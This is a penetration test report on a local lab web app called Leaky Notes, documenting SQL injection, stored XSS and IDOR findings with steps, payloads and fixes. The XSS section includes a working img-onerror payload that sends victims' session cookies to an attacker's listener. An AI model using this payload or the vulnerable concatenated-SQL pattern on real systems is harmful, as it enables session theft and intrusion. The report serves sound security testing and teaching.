# 🛡️ PoC Template — Penetration Test Findings

---

## 📋 Engagement Details

| Field           | Value                                                               |
| --------------- | ------------------------------------------------------------------- |
| **Project**     | Leaky Notes                                                         |
| **Tester**      | Chagai Levi                                                         |
| **Date**        | 2026/11/01                                                          |
| **Test Type**   | White Box                                                           |
| **Scope**       | Testing inputs for vulnerabilities and checking pages on the server |
| **Environment** | localhost + WSL                                                     |
| **Tools**       | Burp Suite, Browser and DevTools                                    |

---

## 📊 Findings Summary

| ID   | Title                  | Severity | Status |
| ---- | ---------------------- | -------- | ------ |
| F-03 | IDOR                   | Critical | Fixed  |
| F-01 | SQL Injection in Login | Critical | Open   |
| F-02 | Stored XSS             | High     | Open   |

---

### [F-01] SQL Injection in Login

| Field          | Details                             |
| -------------- | ----------------------------------- |
| **Severity**   | Critical                            |
| **CVSS Score** | 9.1                                 |
| **Category**   | OWASP A05: Injection (SQL) · CWE-89 |
| **Status**     | Open                                |

### 🎯 Location
<!-- - **Vulnerable parameter:** Username input in `/login` page -->
- **Affected endpoint:** `POST /api/login`
- **Vulnerable parameter:** `username` location: header 

### 📝 Description
The vulnerability is SQL injection. It exists because the programmers used string concatenation in the login code.
The code looks like this:
```js
const user = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```
The server assumes that the username and password are provided as text, rather than as executable code.
However, if an attacker enters a single quote into the username field, it breaks the code structure. Instead of returning a 401 status code, the server returns a 500 error. This signals to the attacker that something unusual is happening. They can then continue testing until they identify it as a SQL injection vulnerability, which they can subsequently exploit.

### 🔑 Preconditions
None — accessible to any user

### 🔁 Steps to Reproduce
1. Open Burp Suite
2. Go to Proxy, then click on HTTP history, and click on Open Browser.
3. Enter the localhost link into the URL address bar in the Burp Suite browser.
4. Go to `/login` on Leaky Notes.
5. Just try a username that comes to mind (for example, Dave).
6. Look, it’s returning a 401 code, which means the username wasn’t found.
7. Right now, only a single quote (') is written. Look—it’s returning a 500 error code, which indicates a server-side issue.

### 💉 Payload

```sql
'
```

### 👁️ Observed Result
```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Access-Control-Allow-Origin: http://127.0.0.1:5173
Vary: Origin
Access-Control-Allow-Credentials: true
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1338
Date: Sun, 01 Nov 2026 19:41:43 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SqliteError: unrecognized token: &quot;&#39;&#39;&#39; AND password = &#39;&#39;&quot;<br> &nbsp; &nbsp;at Database.prepare (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/better-sqlite3/lib/methods/wrappers.js:5:21)<br> &nbsp; &nbsp;at file:///home/<USERNAME>/cyber-lab/leaky-notes/backend/src/server.js:22:19<br> &nbsp; &nbsp;at Layer.handleRequest (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/lib/layer.js:152:17)<br> &nbsp; &nbsp;at next (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/lib/route.js:157:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/lib/route.js:117:3)<br> &nbsp; &nbsp;at handle (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/index.js:435:11)<br> &nbsp; &nbsp;at Layer.handleRequest (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/lib/layer.js:152:17)<br> &nbsp; &nbsp;at /home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/index.js:295:15<br> &nbsp; &nbsp;at processParams (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/index.js:582:12)<br> &nbsp; &nbsp;at next (/home/<USERNAME>/cyber-lab/leaky-notes/backend/node_modules/router/index.js:291:5)</pre>
</body>
</html>
```

### 📸 Evidence
- `wrong-username.png` — description: request and response of normal wrong username
- `sql-injectoin-response.png` — description: request and response of One apostrophe

### 💥 Impact (CIA)
- **Confidentiality:** an attacker could extract usernames and passwords.
- **Integrity:** Yes, if you log in to the admin account.
- **Availability:** Low.

### 🔧 Remediation
- **Primary fix:** Use parameterized queries instead of string concatenation.
Like this:
  ```js
  const user = db.prepare("SELECT * FROM users WHERE username = ? AND password = ?").get(username, password);
  ```
- **Defense in Depth:** Least Privilege, Server-side input validation, WAF and Do not leak detailed errors

### 🔗 References
- OWASP: https://top10.owasp.org/2025/A05_2025-Injection/
- CWE: https://cwe.mitre.org/data/definitions/89.html

---
### [F-02] Stored XSS

| Field          | Details                             |
| -------------- | ----------------------------------- |
| **Severity**   | High                                |
| **CVSS Score** | 8.1                                 |
| **Category**   | OWASP A05: Injection (XSS) · CWE-79 |
| **Status**     | Open                                |

### 🎯 Location
- **Affected endpoint:** `POST /api/comments/` 
- **Vulnerable parameter:** `body` location: body

### 📝 Description
Stored XSS in the comments feature. A comment's `body` is persisted in the database and rendered on the `/comments` page via React's `dangerouslySetInnerHTML` without sanitization, which bypasses React's default escaping and treats stored user input as trusted HTML. As a result, an attacker can store active markup that executes in the browser of every user who loads the page (Stored XSS — no interaction required). Because the `session` cookie is not marked `HttpOnly`, the injected script can read it via `document.cookie` and exfiltrate it, enabling session hijacking and potential account takeover of any viewer.

### 🔑 Preconditions
None — accessible to any user

### 🔁 Steps to Reproduce
1. Go to `/comments`. In the `name` field enter `attacker`, and in the comment field enter `<script>alert(1);</script>`. Submit.
2. Observe that no alert fires. In DevTools → Elements, confirm the `<script>` tag is present in the DOM but was not executed (scripts inserted via innerHTML are inert).
3. On Kali (WSL), start a listener to receive the stolen cookie: `python3 -m http.server 8000`.
4. In DevTools → Network, inspect the `session` cookie and confirm the `HttpOnly` flag is NOT set (so `document.cookie` can read it).
5. Return to `/comments`. In `name` enter `attacker`, and in the comment field inject the payload below. Submit.
6. Load the comments page as a victim (any user viewing the stored comment).

### 💉 Payload
```html
<img src=x onerror="new Image().src='http://127.0.0.1:8000/?c='+encodeURIComponent(document.cookie)">
```

### 👁️ Observed Result
- The `<script>` payload appeared in the DOM (Elements tab) but did not execute.
- The `<img src=x onerror=...>` payload executed when the page loaded.
- The `python3 -m http.server` listener received a request of the form `GET /?c=<url-encoded cookie>` — i.e. the victim's `document.cookie` was successfully exfiltrated to the attacker's server. This confirms the stored comment runs arbitrary JavaScript in every viewer's browser, and the session cookie is readable because `HttpOnly` is absent.

### 📸 Evidence
- `the-cookie-get.png` — The HTTP Request to the localhost with the cookie
- `localhost-eyes.png` - The GET Request from the Console in HTTP Server.

### 💥 Impact (CIA)
- Confidentiality: the `session` cookie of every user who views the comment is stolen (demonstrated).
- Integrity / Account takeover (potential): with a stolen session cookie, an attacker could impersonate the victim and act on their behalf. (Cookie theft demonstrated; takeover not yet demonstrated.)
- Stored XSS means the payload auto-executes for every viewer with no interaction, maximizing reach.

### 🔧 Remediation
- **Primary fix:** Do not use `dangerouslySetInnerHTML`; simply copy the text into place without it. React will automatically handle the escaping.
- **Defense in Depth:** HttpOnly

### 🔗 References
- OWASP: https://top10.owasp.org/2025/A05_2025-Injection/
- CWE: https://cwe.mitre.org/data/definitions/79.html

---
### [F-03] IDOR

| Field          | Details                                    |
| -------------- | ------------------------------------------ |
| **Severity**   | Critical                                   |
| **CVSS Score** | 9.1                                        |
| **Category**   | OWASP A01: Broken Access Control · CWE-639 |
| **Status**     | Fixed                                      |

### 🎯 Location
- **Affected endpoint:**  `GET /api/users/:id`
- **Vulnerable parameter:** `id` location: path

### 📝 Description
An IDOR vulnerability occurs when an identifier (ID)—typically a number—is used on the server side. An attacker might ask themselves, "What happens if I change my user ID—for example, from 3 to 2?" and then test this hypothesis. Consequently, they gain access to another user's information. This vulnerability exists because the server fails to verify whether the user possesses the appropriate permissions to access a specific page (i.e., whether the user is truly the owner of the personal data being accessed).
In other words, the server assumes that anyone accessing a specific ID is the legitimate owner of that account. As a result, an attacker can simply access the system and view personal information—and, in some cases, even passwords.
Furthermore, an attacker can access the personal details of the administrator by changing the ID to 1. Since the server does not verify whether the user is actually an administrator, the attacker gains access to the administrator's personal data and other sensitive information.

### 🔑 Preconditions
None — accessible to any user

### 🔁 Steps to Reproduce
1. Open Burp Suite.
2. Go to the **Proxy** tab, click on **HTTP history**, and then click **Open Browser**.
3. Enter the `localhost` URL into the address bar of the Burp Suite browser.
4. In the HTTP request, check the server's address (look at the `GET` requests to see where they are directed) and copy the server's address.
5. Once you have it, open a new tab in the Burp Suite browser and paste the server's address.
6. Append `api/users/(your id)` to the end of the address, press Enter, and your private information will appear.
7. Now, change the `id` to `1` and press Enter.
8. Congratulations! You have successfully accessed the admin's private information.

### 💉 Payload
```http
GET /api/users/2

GET /api/users/1
```

### 👁️ Observed Result
A private note (`private_note`) was received from another user. I can also do this for the admin by changing the number to 1.

```json
{"username":"alice","private_note":"FAKE account balance note: $48,750 in reserve account"}

{"username":"admin","private_note":"FAKE recovery phrase: velvet comet maple orbit lantern"}
```

### 📸 Evidence
- `server-address.png` — Discovering the server's address
- `userId.png` — Information about the attacker user
- `admin-acking-id.png` — Changing the number to 1 and personal information about the admin
- `after-the-fixes.png` — What it looks like after adding a test user on the server

### 💥 Impact (CIA)
- **Confidentiality:** A leak of all the personal details that users provided on the site.
- **Integrity:** Yes, the leaked recovery phrase could potentially be chained to account recovery/takeover (not demonstrated)
- **Availability:** Low.

### 🔧 Remediation
- **Primary fix:** Added a server-side check to verify whether the user should have access to this data. If not, block access (already fixed).
- **Defense in Depth:** None

### 🔗 References
- OWASP: https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control
- CWE: https://cwe.mitre.org/data/definitions/639.html

---